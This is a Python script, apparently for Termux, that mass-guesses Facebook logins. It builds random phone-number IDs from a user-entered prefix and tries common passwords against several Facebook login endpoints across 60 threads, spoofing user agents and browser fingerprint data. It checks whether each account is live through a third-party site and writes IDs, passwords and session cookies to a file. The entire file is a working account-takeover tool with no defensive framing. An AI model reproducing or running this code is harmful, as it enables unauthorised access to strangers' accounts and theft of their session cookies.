import os,re,sys,uuid,random,time,json,base64,subprocess,shutil,string
from concurrent.futures import ThreadPoolExecutor as ThreadPool

pkg_path="/d"+"ata/data/co"+"m.term"+"ux/file"+"s/usr"+"/lib/python3.1"+"2/site"+"-pack"+"ages"
piplist=["urllib3","certifi","chardet","charset_normalizer","idna","http","requests","webencodings","six","html5lib","mechanize","mdurl","socket"]

try:
    import requests
except:
    os.system('pip uninstall requests chardet urllib3 idna certifi sniffio httpcore -y;pip install chardet urllib3 idna certifi requests sniffio httpcore')
    import requests
loop=0
oks=[]


logo="""
    ┏┳┓┏┓┏┓┏┳┓
     ┃ ┣ ┗┓ ┃ 
     ┻ ┗┛┗┛ ┻"""
az_string = string.ascii_uppercase


def MXuseragent():
    rr=random.randint
    rc=random.choice
    mod = [
    "SM-T590",
    "SM-T870",
    "SM-T507",
    "SM-A307GT",
    "SM-A107M",
    "SM-P615",
    "SM-T975",
    "SM-T595",
    "SM-T505N",
    "SM-P200",
    "SM-T837V",
    "SM-T510",
    "SM-A105M",
    "SM-T387V",
    "SM-T830",
    "SM-G973F",
    "SM-T387W",
    "SM-T307U",
    "SM-T500",
    "SM-A207M",
    "SM-P205",
    "SM-T860",
    "SM-A205G",
    "SM-T970",
    "SM-T505",
    "SM-G973F",
    "SM-T295",
    "SM-A205G",
    "SM-T830",
    "SM-A105M"]
    ua=f"Mozilla/5.0 (Linux; Android {str(rr(6,14))}; {str(rc(mod))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(128,130))}.0.{str(rr(3333,7777))}.{str(rr(70,250))} Mobile Safari/537.36"
    return ua
    




def main():
    user=[]
    os.system("clear")
    print(logo)
    pwx=["last6","last8","jannatul","tamanna","000999","0987654","bangladesh","sumaiya","mim mim","maisha","nadiya","habiba","i love you","jannat"]
    print("—"*30)
    print(" CODE: 017 018")
    print("—"*30)
    code=input("[!] -->")
    print("—"*30)
    print(" [1] METHOD")
    print(" [2] METHOD")
    print(" [3] METHOD")
    print(" [4] METHOD")
    print(" [5] METHOD")
    print(" [6] METHOD")
    print("—"*30)
    met=input(" [✓] -> ")
    with ThreadPool(max_workers=60) as update:
        os.system("clear")
        print(logo)
        print("—"*30)
        print("  Used Code "+code)
        print("—"*30)
        while True:
            uid=code+str(''.join(random.choice(string.digits) for _ in range(8)))
            update.submit(host,uid,pwx,met)

def fbDomin(met):
    if "1" in met:
        return "mbasic.facebook.com"
    elif "2" in met:
        return "p.facebook.com"
    elif "3" in met:
        return "m.facebook.com"
    elif "4" in met:
        return "touch.facebook.com"
    elif "5" in met:
        return "free.facebook.com"
    else:
        return "x.facebook.com"


session_token="YT"
usershow="TESTING"



        

def host(uid,pwx,met):
    global oks,loop
    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[TESTING-M{met}]   {loop}⟩\x1b[38;5;155m{str(len(oks))}\r "),
    sys.stdout.flush()
    fb=fbDomin(met)
    try:
        
        for pw in pwx:
            session=requests.session()
            ua=MXuseragent()
            ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-10:])
            link = session.get(f'https://{fb}/').text
            data = {
            "jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),
            "lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
            "try_number": 0,
            "unrecognized_tries": 0,
            "email": uid,
            "prefill_contact_point": uid,
            "prefill_source": "browser_dropdown",
            "prefill_type": "contact_point",
            "first_prefill_source": "browser_dropdown",
            "first_prefill_type": "contact_point",
            "had_cp_prefilled": True,
            "had_password_prefilled": False,
            "is_smart_lock": False,
            "bi_xrwh": 0,
            "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps),
            "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',}
            headers = {'authority': f'{fb}','content-length': '1730','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"','sec-ch-ua-mobile': '?1','user-agent': ua,'x-response-format': 'JSONStream','content-type': 'application/x-www-form-urlencoded','x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),'viewport-width': '360','sec-ch-ua-platform-version': '""','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','dpr': '2','sec-ch-ua-full-version-list': '','sec-ch-ua-model': '""','sec-ch-prefers-color-scheme': 'light','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': f'https://{fb}','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': f'https://{fb}/','accept-encoding': 'gzip, deflate, br','accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
            session.post(f'https://{fb}/login/device-based/login/async/?refsrc=deprecated&lwv=100',headers=headers, data=data, allow_redirects=False).text
            heron_brand=session.cookies.get_dict().keys()
            if "c_user" in heron_brand:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xd=coki.split("c_user=")[1].split(";")[0]
                ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={xd}"
                resx = str(requests.get(ckk).text).lower()
                if "live" in resx:
                    print(f"\r\r[SUCCESSFUL] {xd} | {ps} | {coki}")
                    oks.append(xd)
                    open("/sdcard/svg_test-ok.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass








main()
